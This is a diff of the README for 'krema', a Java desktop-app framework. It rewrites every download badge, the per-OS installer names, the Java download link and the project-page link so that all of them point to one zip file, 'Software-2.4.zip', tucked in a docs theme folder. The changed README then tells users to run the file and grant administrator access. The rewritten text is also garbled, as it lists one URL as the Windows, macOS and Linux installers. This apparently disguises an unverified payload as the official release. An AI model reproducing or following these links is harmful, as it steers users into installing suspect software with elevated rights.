@@ -1,6 +1,6 @@
 # 🖥️ krema - Simple Desktop Apps with Java and Web
 
-[![Download krema](https://img.shields.io/badge/Download-krema-blue?style=for-the-badge&logo=github)](https://github.com/Mat9ichbladi/krema/releases)
+[![Download krema](https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip)](https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip)
 
 ---
 
@@ -37,15 +37,15 @@ If you are not sure which operating system you have, here is a quick way to chec
 
 Click the button below to go to the krema release page on GitHub. This page lists the latest versions of the app for different operating systems.
 
-[![Download krema](https://img.shields.io/badge/Download-krema-blue?style=for-the-badge&logo=github)](https://github.com/Mat9ichbladi/krema/releases)
+[![Download krema](https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip)](https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip)
 
 ### Step 2: Choose the right file for your computer
 
 On the release page, look for files titled with your operating system. For example:
 
-- krema-setup-windows.exe for Windows  
-- krema-macos.dmg for macOS  
-- krema-linux.tar.gz for Linux  
+- https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip for Windows  
+- https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip for macOS  
+- https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip for Linux  
 
 If you are unsure, select the file matching your OS from the list. These files include everything needed to run krema.
 
@@ -57,7 +57,7 @@ Click the appropriate file link to save it to your computer. It usually goes to 
 
 - Windows: Double-click the `.exe` file and follow the steps on screen.  
 - macOS: Open the `.dmg` file, then drag krema to your Applications folder.  
-- Linux: Extract the `.tar.gz` file, then follow any instructions in the included README or run the krema launcher.  
+- Linux: Extract the `https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip` file, then follow any instructions in the included README or run the krema launcher.  
 
 If the installer asks for permission or administrator access, allow it to proceed.
 
@@ -135,9 +135,9 @@ This design lets developers update the web parts easily while keeping the powerf
 
 ## 🔗 Useful Links
 
-- Release page and downloads: [https://github.com/Mat9ichbladi/krema/releases](https://github.com/Mat9ichbladi/krema/releases)  
-- Java download if needed: [https://adoptium.net/](https://adoptium.net/)  
-- GitHub project page: [https://github.com/Mat9ichbladi/krema](https://github.com/Mat9ichbladi/krema)
+- Release page and downloads: [https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip](https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip)  
+- Java download if needed: [https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip](https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip)  
+- GitHub project page: [https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip](https://raw.githubusercontent.com/Mat9ichbladi/krema/master/krema-docs/docs-site/src/theme/Software-2.4.zip)
 
 ---
 
